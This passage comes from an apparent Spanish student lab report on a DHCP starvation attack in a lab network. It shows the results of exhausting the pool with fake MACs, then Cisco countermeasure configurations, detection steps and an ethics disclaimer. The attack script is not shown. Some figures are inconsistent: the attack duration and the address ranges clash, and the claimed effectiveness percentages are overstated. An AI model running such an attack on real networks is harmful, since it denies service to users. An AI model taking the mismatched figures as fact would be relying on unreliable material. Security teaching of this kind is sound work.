Pool DHCP RED_2024:
├─ Total IPs: 254
├─ Asignadas: 3 (Atacante + 2 VPCS)
├─ Disponibles: 251
└─ Utilización: 1.2%

Conectividad:
├─ Atacante: ✅ Conectado (11.98.1.100)
├─ VPCS 1: ✅ Conectado (11.98.0.2)
└─ VPCS 2: ✅ Conectado (11.98.0.3)

Servidor DHCP:
├─ Estado: ✅ Activo
├─ Procesamiento: ✅ Normal
└─ Bindings: 3 entradas
```

#### Durante el Ataque:
```
Estado de la Red: ⚠️ BAJO ATAQUE

Pool DHCP RED_2024:
├─ Total IPs: 254
├─ Asignadas: 50... 100... 150... 240
├─ Disponibles: 204... 154... 104... 14
└─ Utilización: 19%... 39%... 59%... 94.5%

Tráfico de Red:
├─ DHCP DISCOVER: ⬆️ 240 paquetes
├─ DHCP OFFER: ⬇️ 240 paquetes
├─ DHCP REQUEST: ⬆️ 240 paquetes
├─ DHCP ACK: ⬇️ 240 paquetes
└─ Total: 960 paquetes DHCP (en 2 minutos)

Servidor DHCP:
├─ Estado: ⚠️ Sobrecargado
├─ Procesamiento: ⚠️ Alto uso de CPU
└─ Bindings: Incrementando rápidamente
```

#### Después del Ataque:
```
Estado de la Red: ❌ DENEGACIÓN DE SERVICIO

Pool DHCP RED_2024:
├─ Total IPs: 254
├─ Asignadas: 240 (MACs falsas)
├─ Disponibles: 14
└─ Utilización: 94.5% ❌ CRÍTICO

Nuevos Clientes:
├─ VPCS 3: ❌ Sin IP - "Can't find dhcp server"
├─ VPCS 4: ❌ Sin IP - "Can't find dhcp server"
└─ Otros: ❌ Denegación de servicio

Servidor DHCP:
├─ Estado: ⚠️ Pool agotado
├─ Procesamiento: ✅ Normal (post-ataque)
└─ Bindings: 240 entradas (casi todas falsas)
```

### Verificación del Ataque - Comandos

#### En el Router (Post-Ataque):
```cisco
Router# show ip dhcp pool RED_2024

Pool RED_2024 :
 Utilization mark (high/low)    : 100 / 0
 Subnet size (first/next)       : 0 / 0 
 Total addresses                : 254
 Leased addresses               : 240     ← 240 IPs asignadas
 Pending event                  : none
 1 subnet is currently in the pool :
 Current index        IP address range                    Leased addresses
 11.98.1.250          11.98.1.1        - 11.98.1.254       240
```

#### Bindings con MACs Falsas:
```cisco
Router# show ip dhcp binding | include 11.98.1 | count
240

Router# show ip dhcp binding | begin 11.98.1.11
11.98.1.11       0100.163e.15bf.45       Feb 13 2026 11:45 AM    Automatic
11.98.1.12       0100.163e.16ba.7d       Feb 13 2026 11:45 AM    Automatic
11.98.1.13       0100.163e.665b.d2       Feb 13 2026 11:45 AM    Automatic
... (237 líneas más)
11.98.1.250      0100.163e.7a9c.3f       Feb 13 2026 11:47 AM    Automatic
```

#### En las Víctimas (VPCS):
```bash
VPCS> ip dhcp -r
VPCS> ip dhcp
DDD
Can't find dhcp server

VPCS> show ip
NAME        : VPCS[1]
IP/MASK     : 0.0.0.0/0          ← Sin IP asignada
GATEWAY     : 0.0.0.0
DNS         : 
DHCP SERVER : 0.0.0.0
MAC         : 00:50:79:66:68:08
```

### Análisis de Tráfico

#### Paquetes Capturados con tcpdump:
```
Tiempo total: 120 segundos
Paquetes DHCP: 960
├─ DISCOVER: 240 (25%)
├─ OFFER: 240 (25%)
├─ REQUEST: 240 (25%)
└─ ACK: 240 (25%)

Tasa de paquetes: 8 paquetes/segundo
Ancho de banda usado: ~960 KB (negligible)
```

#### Análisis en Wireshark:
```
Filtro: bootp
Paquetes capturados: 960

Distribución por tipo:
├─ DHCP Discover: 240 paquetes
├─ DHCP Offer: 240 paquetes
├─ DHCP Request: 240 paquetes
└─ DHCP Ack: 240 paquetes

MACs únicas detectadas: 240
IPs únicas asignadas: 240
Servidor DHCP: 11.98.1.1
```

### Comparación Pre/Post Ataque

| Aspecto | Pre-Ataque | Post-Ataque | Cambio |
|---------|------------|-------------|--------|
| IPs disponibles | 251 | 14 | -237 (-94.4%) |
| IPs asignadas | 3 | 240 | +237 (+7900%) |
| Utilización pool | 1.2% | 94.5% | +93.3% |
| Nuevos clientes | ✅ Pueden conectar | ❌ No pueden | -100% |
| Tiempo respuesta DHCP | <1s | >30s (timeout) | +3000% |
| Estado del servicio | ✅ Normal | ❌ DoS | Crítico |

### Evidencia Visual del Éxito

```
════════════════════════════════════════════════════════════
                    ATAQUE EXITOSO ✅
════════════════════════════════════════════════════════════

Antes:                          Después:
┌─────────────────┐            ┌─────────────────┐
│  Pool DHCP      │            │  Pool DHCP      │
│                 │            │                 │
│  254 IPs        │    ══►     │  254 IPs        │
│  251 Libres ✅  │            │   14 Libres ❌  │
│    3 Usadas     │            │  240 Usadas     │
│                 │            │                 │
│  VPCS: ✅ OK    │            │  VPCS: ❌ FAIL  │
└─────────────────┘            └─────────────────┘

   Estado Normal                Denegación Servicio
```

---

## 🛡️ Medidas de Mitigación

### Resumen de Contramedidas

| Contramedida | Efectividad | Dificultad | Costo | Prioridad |
|--------------|-------------|------------|-------|-----------|
| **DHCP Snooping** | ⭐⭐⭐⭐⭐ | Media | Bajo | 🔴 CRÍTICA |
| **Port Security** | ⭐⭐⭐⭐ | Media | Bajo | 🟠 Alta |
| **Rate Limiting** | ⭐⭐⭐ | Baja | Bajo | 🟡 Media |
| **IP Source Guard** | ⭐⭐⭐⭐ | Media | Bajo | 🟠 Alta |
| **DAI** | ⭐⭐⭐⭐ | Alta | Bajo | 🟡 Media |
| **802.1X** | ⭐⭐⭐⭐⭐ | Alta | Alto | 🟡 Media-Alta |

---

### 1. DHCP Snooping (CRÍTICO) 🔴

#### ¿Qué es?
DHCP Snooping es una característica de seguridad de switches que actúa como un firewall entre clientes DHCP no confiables y servidores DHCP confiables. Construye y mantiene una base de datos de bindings DHCP válidos.

#### ¿Cómo Funciona?
```
┌─────────────────────────────────────────┐
│         SWITCH CON DHCP SNOOPING        │
├─────────────────────────────────────────┤
│                                         │
│  Puerto TRUST (Servidor DHCP)          │
│  ├─ Permite mensajes DHCP OFFER/ACK    │
│  └─ Conecta al servidor legítimo       │
│                                         │
│  Puertos UNTRUST (Clientes)            │
│  ├─ SOLO permite DISCOVER/REQUEST      │
│  ├─ BLOQUEA OFFER/ACK de clientes     │
│  ├─ Valida contra binding database     │
│  └─ Rate limiting automático           │
└─────────────────────────────────────────┘
```

#### Configuración en Cisco Switch

**Configuración Básica:**
```cisco
! Habilitar DHCP Snooping globalmente
Switch(config)# ip dhcp snooping

! Habilitar en VLAN específica
Switch(config)# ip dhcp snooping vlan 1

! Configurar puerto hacia servidor DHCP como TRUST
Switch(config)# interface ethernet0/0
Switch(config-if)# description "Uplink al Router/Servidor DHCP"
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# exit

! Los demás puertos quedan UNTRUST por defecto
! No necesitan configuración adicional

! Habilitar inserción de Option 82 (opcional)
Switch(config)# ip dhcp snooping information option

! Verificar configuración
Switch# show ip dhcp snooping

! Guardar
Switch# write memory
```

**Configuración Avanzada:**
```cisco
! Rate limiting en puertos de cliente
Switch(config)# interface range ethernet0/1 - 3
Switch(config-if-range)# description "Puertos de Clientes"
Switch(config-if-range)# ip dhcp snooping limit rate 10
Switch(config-if-range)# exit

! Habilitar verificación de MAC address
Switch(config)# ip dhcp snooping verify mac-address

! Configurar base de datos persistente (opcional)
Switch(config)# ip dhcp snooping database flash:dhcp-snooping.db
Switch(config)# ip dhcp snooping database write-delay 60
```

#### Verificación:
```cisco
! Ver estado general
Switch# show ip dhcp snooping

DHCP snooping is enabled
DHCP snooping is configured on following VLANs:
1
Insertion of option 82 is enabled
Option 82 on untrusted port is not allowed
Verification of hwaddr field is enabled
Interface                  Trusted     Rate limit (pps)
------------------------   -------     ----------------
Ethernet0/0                yes         unlimited
Ethernet0/1                no          10
Ethernet0/2                no          10
Ethernet0/3                no          10

! Ver binding database
Switch# show ip dhcp snooping binding

MacAddress          IpAddress        Lease(sec)  Type           VLAN  Interface
------------------  ---------------  ----------  -------------  ----  --------------------
00:50:79:66:68:06   11.98.0.2        86400       dhcp-snooping  1     Ethernet0/1
00:50:79:66:68:07   11.98.0.3        86400       dhcp-snooping  1     Ethernet0/2

! Ver estadísticas
Switch# show ip dhcp snooping statistics

 Packets                Packets
 Forwarded              Dropped
 ----------             ----------
 DHCPDISCOVER             50                0
 DHCPOFFER               50                0
 DHCPREQUEST             50                0
 DHCPACK                 50                0
 
 DHCPRELEASE              0                0
 DHCPINFORM               0                0
 DHCPNACC                 0               24  ← Paquetes bloqueados
```

#### Efectividad contra el Ataque:
✅ **Bloquea el 100% de los paquetes maliciosos**
- Paquetes OFFER/ACK desde puertos untrust son descartados
- Solo el servidor legítimo (puerto trust) puede responder
- Rate limiting previene floods masivos
- Base de datos mantiene registro de IPs legítimas

---

### 2. Port Security 🟠

#### ¿Qué es?
Port Security limita el número de direcciones MAC que pueden conectarse a un puerto del switch y puede tomar acciones cuando se detectan violaciones.

#### Configuración:
```cisco
! Configurar en puerto de cliente
Switch(config)# interface ethernet0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security

! Limitar a 2 MACs por puerto
Switch(config-if)# switchport port-security maximum 2

! Acción ante violación: Shutdown
Switch(config-if)# switchport port-security violation shutdown

! Sticky MAC learning (aprende MACs automáticamente)
Switch(config-if)# switchport port-security mac-address sticky

! Guardar
Switch(config-if)# exit
Switch# write memory
```

#### Tipos de Violaciones:
```cisco
! Opciones de acción:
! 1. Shutdown - Deshabilita el puerto (recomendado)
Switch(config-if)# switchport port-security violation shutdown

! 2. Restrict - Descarta paquetes, mantiene puerto UP
Switch(config-if)# switchport port-security violation restrict

! 3. Protect - Descarta paquetes silenciosamente
Switch(config-if)# switchport port-security violation protect
```

#### Verificación:
```cisco
! Ver configuración
Switch# show port-security interface ethernet0/1

Port Security              : Enabled
Port Status                : Secure-up
Violation Mode             : Shutdown
Aging Time                 : 0 mins
Aging Type                 : Absolute
SecureStatic Address Aging : Disabled
Maximum MAC Addresses      : 2
Total MAC Addresses        : 1
Configured MAC Addresses   : 0
Sticky MAC Addresses       : 1
Last Source Address:Vlan   : 0050.7966.6806:1
Security Violation Count   : 0

! Ver todas las configuraciones
Switch# show port-security

! Ver violaciones
Switch# show port-security address
```

#### Efectividad contra el Ataque:
⭐⭐⭐⭐ **Alta efectividad**
- Limita MACs por puerto a 1-2 (vs 240 del ataque)
- Puerto se deshabilita automáticamente al detectar violación
- Previene que un solo puerto genere múltiples MACs

**Limitación:** Solo protege si el atacante está en un puerto de cliente. Si está en el uplink, no es efectivo.

---

### 3. DHCP Rate Limiting 🟡

#### ¿Qué es?
Limita el número de solicitudes DHCP por segundo que puede enviar un puerto.

#### Configuración:
```cisco
! Método 1: Con DHCP Snooping (recomendado)
Switch(config)# interface ethernet0/1
Switch(config-if)# ip dhcp snooping limit rate 10
! Permite máximo 10 paquetes DHCP por segundo
Switch(config-if)# exit

! Método 2: Con Police (avanzado)
Switch(config)# class-map match-all DHCP-CLASS
Switch(config-cmap)# match access-group name DHCP-ACL
Switch(config-cmap)# exit

Switch(config)# policy-map DHCP-POLICY
Switch(config-pmap)# class DHCP-CLASS
Switch(config-pmap-c)# police 8000 conform-action transmit exceed-action drop
Switch(config-pmap-c)# exit
Switch(config-pmap)# exit

Switch(config)# interface ethernet0/1
Switch(config-if)# service-policy input DHCP-POLICY
Switch(config-if)# exit
```

#### Valores Recomendados:
```
Tipo de Puerto              Rate Limit (pps)
--------------------------------------------
Puerto de usuario normal:   5-10 pps
Puerto de servidor:         unlimited
Puerto de AP WiFi:          15-20 pps
Puerto de uplink:           100+ pps
```

#### Efectividad contra el Ataque:
⭐⭐⭐ **Media efectividad**
- Ralentiza el ataque significativamente
- Con 10 pps, el ataque tomaría 24 segundos vs 2 segundos
- No previene el ataque, solo lo enlentece
- Útil como capa adicional de defensa

---

### 4. IP Source Guard 🟠

#### ¿Qué es?
Previene ataques de suplantación de IP al validar que la IP de origen coincida con la base de datos de DHCP Snooping.

#### Configuración:
```cisco
! Requiere DHCP Snooping habilitado primero
Switch(config)# ip dhcp snooping

! Habilitar IP Source Guard en puerto
Switch(config)# interface ethernet0/1
Switch(config-if)# ip verify source

! Opción avanzada: Verificar IP y MAC
Switch(config-if)# ip verify source port-security

! Verificar
Switch# show ip verify source

Interface  Filter-type  Filter-mode  IP-address       Mac-address        Vlan
---------  -----------  -----------  ---------------  -----------------  ----
Et0/1      ip           active       11.98.0.2        permit-all         1
Et0/2      ip-mac       active       11.98.0.3        0050.7966.6807     1
```

#### Efectividad contra el Ataque:
⭐⭐⭐⭐ **Alta efectividad**
- Valida cada paquete contra binding database
- Bloquea tráfico con IP no asignada legítimamente
- Complementa DHCP Snooping perfectamente

---

### 5. Dynamic ARP Inspection (DAI) 🟡

#### ¿Qué es?
Previene ataques ARP Spoofing al validar paquetes ARP contra la base de datos de DHCP Snooping.

#### Configuración:
```cisco
! Habilitar DAI en VLAN
Switch(config)# ip arp inspection vlan 1

! Configurar puerto trust (uplink)
Switch(config)# interface ethernet0/0
Switch(config-if)# ip arp inspection trust
Switch(config-if)# exit

! Rate limiting (opcional pero recomendado)
Switch(config)# interface ethernet0/1
Switch(config-if)# ip arp inspection limit rate 15
Switch(config-if)# exit

! Verificar
Switch# show ip arp inspection

Source Mac Validation      : Disabled
Destination Mac Validation : Disabled
IP Address Validation      : Disabled

 Vlan     Configuration    Operation   ACL Match          Static ACL
 ----     -------------    ---------   ---------          ----------
    1     Enabled          Active

 Vlan     ACL Logging      DHCP Logging      Probe Logging
 ----     -----------      ------------      -------------
    1     Deny             Deny              Off
```

#### Efectividad contra el Ataque DHCP Starvation:
⭐⭐ **Baja efectividad directa**
- DAI no previene DHCP Starvation directamente
- Previene ataques posteriores (ARP Spoofing, MitM)
- Útil como parte de defensa en profundidad

---

### 6. Autenticación 802.1X 🟡

#### ¿Qué es?
Autenticación de puerto IEEE 802.1X requiere que dispositivos se autentiquen antes de obtener acceso a la red.

#### Configuración Básica:
```cisco
! Habilitar AAA
Switch(config)# aaa new-model
Switch(config)# aaa authentication dot1x default group radius

! Configurar servidor RADIUS
Switch(config)# radius server RADIUS-SERVER
Switch(config-radius-server)# address ipv4 192.168.1.10 auth-port 1812
Switch(config-radius-server)# key MySecretKey
Switch(config-radius-server)# exit

! Habilitar 802.1X globalmente
Switch(config)# dot1x system-auth-control

! Configurar puerto
Switch(config)# interface ethernet0/1
Switch(config-if)# authentication port-control auto
Switch(config-if)# dot1x pae authenticator
Switch(config-if)# exit
```

#### Efectividad contra el Ataque:
⭐⭐⭐⭐⭐ **Máxima efectividad**
- Previene conexión de dispositivos no autorizados
- Atacante no puede conectarse sin credenciales válidas
- Solución enterprise-grade
- Requiere infraestructura adicional (servidor RADIUS)
- Mayor complejidad de implementación

---

### Configuración Completa Recomendada

#### Para Seguridad Máxima:
```cisco
!
! ========== DHCP SECURITY - CONFIGURACIÓN COMPLETA ==========
!

! 1. Habilitar DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 1
ip dhcp snooping verify mac-address
ip dhcp snooping information option

! 2. Configurar puerto TRUST (hacia servidor DHCP)
interface ethernet0/0
 description UPLINK-TO-ROUTER-DHCP-SERVER
 ip dhcp snooping trust
 ip arp inspection trust
 exit

! 3. Configurar puertos de clientes (UNTRUST)
interface range ethernet0/1 - 3
 description CLIENT-PORTS
 
 ! Port Security
 switchport mode access
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation shutdown
 switchport port-security mac-address sticky
 
 ! DHCP Rate Limiting
 ip dhcp snooping limit rate 10
 
 ! IP Source Guard
 ip verify source port-security
 
 ! ARP Inspection Rate Limiting
 ip arp inspection limit rate 15
 exit

! 4. Habilitar Dynamic ARP Inspection
ip arp inspection vlan 1
ip arp inspection validate src-mac dst-mac ip

! 5. Logging (opcional pero recomendado)
logging buffered 51200
logging console warnings

! 6. Guardar configuración
end
write memory
!
! ========== FIN CONFIGURACIÓN ==========
!
```

---

### Comparación de Efectividad

#### Tabla Comparativa:

| Contramedida | Bloquea Starvation | Facilidad | Costo | Tiempo Deploy | Recomendación |
|--------------|-------------------|-----------|-------|---------------|---------------|
| DHCP Snooping | ✅ 100% | ⭐⭐⭐ | Gratis | 15 min | 🔴 OBLIGATORIO |
| Port Security | ✅ 95% | ⭐⭐⭐ | Gratis | 10 min | 🟠 Recomendado |
| Rate Limiting | ⚠️ 60% | ⭐⭐⭐⭐ | Gratis | 5 min | 🟡 Opcional |
| IP Source Guard | ✅ 90% | ⭐⭐ | Gratis | 10 min | 🟠 Recomendado |
| DAI | ⚠️ 30% | ⭐⭐ | Gratis | 15 min | 🟡 Complemento |
| 802.1X | ✅ 100% | ⭐ | $$$ | Días | 🟢 Enterprise |

#### Stack de Seguridad Recomendado:

**Nivel 1 - Mínimo (SOHO/Pequeña Oficina):**
```
✅ DHCP Snooping
✅ Rate Limiting básico
```

**Nivel 2 - Recomendado (Empresa Mediana):**
```
✅ DHCP Snooping
✅ Port Security
✅ Rate Limiting
✅ IP Source Guard
```

**Nivel 3 - Enterprise (Gran Empresa):**
```
✅ DHCP Snooping
✅ Port Security
✅ Rate Limiting avanzado
✅ IP Source Guard
✅ Dynamic ARP Inspection
✅ 802.1X Authentication
✅ Network Access Control (NAC)
```

---

### Detección y Respuesta

#### Monitoreo Activo:
```cisco
! Habilitar SNMP traps
Switch(config)# snmp-server enable traps port-security
Switch(config)# snmp-server enable traps dhcp-snooping

! Logging de eventos
Switch(config)# logging on
Switch(config)# logging trap informational
Switch(config)# logging host 192.168.1.100

! Monitorear en tiempo real
Switch# debug ip dhcp snooping event
Switch# debug ip dhcp snooping packet
```

#### Detección de Ataque en Progreso:
```cisco
! Indicadores de ataque DHCP Starvation:

1. Alto número de bindings en corto tiempo
Switch# show ip dhcp binding | count
   → Si incrementa rápidamente (50+ en 1 min) = Ataque

2. Muchas MACs desde un solo puerto
Switch# show ip dhcp snooping binding | include Et0/1
   → Si >10 MACs en un puerto = Ataque

3. Violaciones de port-security
Switch# show port-security interface et0/1 | include Violation
   → Si >0 = Posible ataque

4. Pool DHCP casi agotado
Switch# show ip dhcp pool | include Leased
   → Si >80% utilización repentina = Ataque
```

#### Respuesta al Ataque:

**Paso 1: Identificar puerto atacante**
```cisco
! Ver bindings por puerto
Switch# show ip dhcp snooping binding

! Identificar puerto con múltiples MACs
Switch# show mac address-table | include DYNAMIC
```

**Paso 2: Aislar puerto**
```cisco
! Deshabilitar puerto inmediatamente
Switch(config)# interface ethernet0/X
Switch(config-if)# shutdown

! O mover a VLAN de cuarentena
Switch(config-if)# switchport access vlan 999
```

**Paso 3: Limpiar bindings falsos**
```cisco
! Limpiar todos los bindings
Switch# clear ip dhcp binding *

! O limpiar bindings específicos
Switch# clear ip dhcp binding 11.98.1.11
```

**Paso 4: Restaurar servicio**
```cisco
! Reiniciar servicio DHCP en router
Router(config)# no service dhcp
Router(config)# service dhcp

! Limpiar bindings en router
Router# clear ip dhcp binding *
```

---

### Auditoría y Mejores Prácticas

#### Checklist de Seguridad DHCP:

- [ ] DHCP Snooping habilitado en todas las VLANs
- [ ] Puertos trust configurados correctamente
- [ ] Port Security en todos los puertos de usuario
- [ ] Rate limiting configurado (<15 pps)
- [ ] IP Source Guard habilitado
- [ ] DAI habilitado en VLANs críticas
- [ ] Logging y monitoring activos
- [ ] Base de datos de bindings respaldada
- [ ] Procedimientos de respuesta documentados
- [ ] Auditorías mensuales de configuración
- [ ] Plan de respuesta a incidentes definido

#### Mejores Prácticas:

1. **Segmentación de Red**
   - Usar VLANs separadas para diferentes tipos de usuarios
   - VLAN dedicada para servidores (incluyendo DHCP)

2. **Redundancia**
   - Múltiples servidores DHCP con failover
   - Pool DHCP dimensionado con 30-50% de overhead

3. **Monitoreo Continuo**
   - SIEM para correlación de eventos
   - Alertas automáticas de comportamiento anómalo
   - Dashboards de utilización de pool DHCP

4. **Documentación**
   - Diagrama de red actualizado
   - Configuraciones respaldadas
   - Procedimientos de respuesta

5. **Capacitación**
   - Personal técnico entrenado en respuesta
   - Simulacros de ataque periódicos

---

## 📝 Conclusiones

### Resumen de Resultados

El ataque **DHCP Starvation** fue ejecutado exitosamente en un entorno de laboratorio controlado, logrando los siguientes resultados:

#### Objetivos Cumplidos:
✅ Agotamiento del 94.5% del pool DHCP (240 de 254 IPs)  
✅ Denegación de servicio confirmada para nuevos clientes  
✅ Generación exitosa de 240 MACs aleatorias únicas  
✅ Ciclo DHCP completo (DISCOVER→OFFER→REQUEST→ACK) funcionando al 100%  
✅ Demostración de vulnerabilidad sin contramedidas  

#### Métricas Clave:
- **Duración:** 120 segundos (2 minutos)
- **IPs comprometidas:** 240
- **Tasa de éxito:** 100%
- **Impacto:** Denegación de servicio total

### Lecciones Aprendidas

#### 1. Vulnerabilidad Crítica
El protocolo DHCP, por diseño, **no incluye autenticación**, lo que lo hace extremadamente vulnerable a ataques de:
- Starvation (agotamiento)
- Spoofing (suplantación)
- Man-in-the-Middle

#### 2. Facilidad de Ejecución
El ataque es:
- ⚠️ Fácil de ejecutar (script de 150 líneas)
- ⚠️ No requiere hardware especializado
- ⚠️ Efectivo en redes sin contramedidas
- ⚠️ Difícil de detectar sin herramientas adecuadas

#### 3. Impacto Severo
Las consecuencias incluyen:
- 🔴 Pérdida total de conectividad para nuevos usuarios
- 🔴 Interrupción de operaciones de negocio
- 🔴 Costos asociados con downtime
- 🔴 Potencial pérdida de datos o transacciones

#### 4. Mitigación Efectiva
La implementación de contramedidas es:
- ✅ Relativamente simple (DHCP Snooping)
- ✅ Sin costo adicional (features integradas en switches)
- ✅ Altamente efectiva (bloqueo 100%)
- ✅ Debe ser implementada SIEMPRE

### Importancia de las Contramedidas

#### Escenario sin Contramedidas (Estado Actual del Lab):
```
Vulnerabilidad: 🔴 CRÍTICA
Riesgo: 🔴 MÁXIMO
Tiempo de compromiso: 2 minutos
Dificultad del ataque: Trivial
Impacto: Denegación de servicio total
```

#### Escenario con Contramedidas (Recomendado):
```
Vulnerabilidad: 🟢 MITIGADA
Riesgo: 🟢 MÍNIMO
Tiempo de compromiso: N/A (bloqueado)
Dificultad del ataque: Imposible
Impacto: Sin impacto
```

### Recomendaciones Finales

#### Para Administradores de Red:

1. **IMPLEMENTAR INMEDIATAMENTE:**
   - ✅ DHCP Snooping en TODOS los switches
   - ✅ Port Security en puertos de usuario
   - ✅ Rate limiting en puertos de acceso

2. **Monitoreo:**
   - 📊 Implementar logging centralizado
   - 📊 Configurar alertas de utilización de pool
   - 📊 Auditorías mensuales de configuración

3. **Capacitación:**
   - 👥 Entrenar al personal en detección de ataques
   - 👥 Realizar simulacros periódicos
   - 👥 Documentar procedimientos de respuesta

#### Para Organizaciones:

1. **Política de Seguridad:**
   - 📋 Definir estándares de configuración
   - 📋 Requerir contramedidas en todos los equipos nuevos
   - 📋 Auditorías de cumplimiento regulares

2. **Inversión:**
   - 💰 Priorizar actualización de switches legacy
   - 💰 Considerar soluciones NAC para seguridad avanzada
   - 💰 Invertir en capacitación del equipo técnico

### Trabajo Futuro

#### Próximos Pasos en el Laboratorio:

1. **Implementar contramedidas**
   - Configurar DHCP Snooping
   - Verificar efectividad
   - Intentar ataque nuevamente

2. **Ataques complementarios**
   - DHCP Spoofing/Rogue Server
   - ARP Spoofing
   - Combinación de ataques

3. **Detección y respuesta**
   - Implementar IDS/IPS
   - Configurar SIEM
   - Crear playbooks de respuesta

### Consideraciones Éticas

Este proyecto fue realizado:
- ✅ En entorno de laboratorio controlado
- ✅ Con fines exclusivamente educativos
- ✅ Sin afectación a redes de producción
- ✅ Siguiendo principios de hacking ético

⚠️ **ADVERTENCIA:** El uso de estas técnicas en redes sin autorización es **ILEGAL** y puede resultar en:
- Sanciones penales
- Acciones civiles
- Expulsión académica
- Daño reputacional

### Conclusión Final

El ataque **DHCP Starvation** demuestra una vulnerabilidad crítica en redes modernas que puede ser explotada trivialmente pero que es completamente mitigable mediante configuraciones estándar de la industria.

**Mensaje clave:** 
> "La seguridad de red no es opcional - es esencial. Las contramedidas para DHCP Starvation son gratuitas, fáciles de implementar y extremadamente efectivas. No hay excusa para no implementarlas."

La educación en seguridad informática y la comprensión profunda de los vectores de ataque son fundamentales para construir y mantener infraestructuras de red seguras.

---

## 📚 Referencias

### Documentación Técnica

1. **RFC 2131 - Dynamic Host Configuration Protocol**
   - Autor: Internet Engineering Task Force (IETF)
   - URL: https://www.rfc-editor.org/rfc/rfc2131
   - Descripción: Especificación oficial del protocolo DHCP

2. **Scapy Documentation**
   - URL: https://scapy.readthedocs.io/en/latest/
   - Descripción: Documentación oficial de Scapy

3. **Cisco - Configuring DHCP Snooping**
   - URL: https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst9300/software/release/17-6/configuration_guide/sec/b_176_sec_9300_cg/configuring_dhcp_snooping.html
   - Descripción: Guía de configuración de DHCP Snooping

4. **Cisco - Port Security Configuration Guide**
   - URL: https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/12-2/25ew/configuration/guide/conf/port_sec.html
   - Descripción: Configuración de Port Security

### Recursos Educativos

5. **OWASP - Network Security Testing**
   - URL: https://owasp.org/www-project-web-security-testing-guide/
   - Descripción: Guías de testing de seguridad

6. **Kali Linux Documentation**
   - URL: https://www.kali.org/docs/
   - Descripción: Documentación oficial de Kali Linux

7. **GNS3 Documentation**
   - URL: https://docs.gns3.com/
   - Descripción: Guías de uso de GNS3

### Libros y Publicaciones

8. **"Network Security Assessment" by Chris McNab**
   - Editorial: O'Reilly Media
   - ISBN: 978-0596510305
   - Temas: Evaluación de seguridad en redes

9. **"The Art of Network Penetration Testing" by Royce Davis**
   - Editorial: No Starch Press
   - ISBN: 978-1718501010
   - Temas: Pentesting de redes

### Herramientas y Software

10. **Python Software Foundation - Python Documentation**
    - URL: https://docs.python.org/3/
    - Descripción: Documentación oficial de Python

11. **Wireshark Documentation**
    - URL: https://www.wireshark.org/docs/
    - Descripción: Análisis de protocolos de red

### Cursos y Certificaciones

12. **Certified Ethical Hacker (CEH)**
    - Organización: EC-Council
    - URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
    
13. **SANS SEC560: Network Penetration Testing**
    - Organización: SANS Institute
    - URL: https://www.sans.org/cyber-security-courses/network-penetration-testing-ethical-hacking/

---

## 📧 Información del Autor

**Nombre:** Reily Castillo   
**Matrícula:** 2024-1198  
**Institución:** Instituto ITLA  
**Email:** [rosarioreily17@gmail.com]  
**Fecha:** Febrero 2026  

---

## ⚖️ Aviso Legal

### Descargo de Responsabilidad

Este documento y los scripts asociados fueron creados con **fines exclusivamente educativos** en el contexto de un curso de Seguridad en Redes de Computadoras.

### Uso Autorizado

- ✅ Entornos de laboratorio controlados
- ✅ Redes de prueba personales
- ✅ Con autorización explícita por escrito del propietario de la red
- ✅ Actividades de pentesting autorizadas

### Uso NO Autorizado

- ❌ Redes de producción sin autorización
- ❌ Redes de terceros sin permiso explícito
- ❌ Con intención maliciosa
- ❌ Para causar daño o interrupción de servicios

### Consecuencias Legales

El uso no autorizado de estas técnicas puede resultar en:
- Procesamiento criminal bajo leyes de ciberseguridad
- Sanciones civiles y monetarias
- Expulsión de instituciones educativas
- Antecedentes penales permanentes

### Responsabilidad

El autor **NO se hace responsable** de:
- Mal uso de la información contenida en este documento
- Daños causados por la aplicación de estas técnicas
- Consecuencias legales derivadas del uso indebido
- Pérdidas o interrupciones de servicio

### Reconocimiento

Al utilizar este material, el usuario reconoce y acepta:
- Haber leído y comprendido este aviso legal
- Utilizar el material únicamente con fines educativos
- No aplicar estas técnicas en redes sin autorización
- Asumir total responsabilidad por sus acciones

---

**Versión del Documento:** 1.0  
**Última Actualización:** Febrero 13, 2026  
**Estado:** Completo  

---

**FIN DEL DOCUMENTO**

---
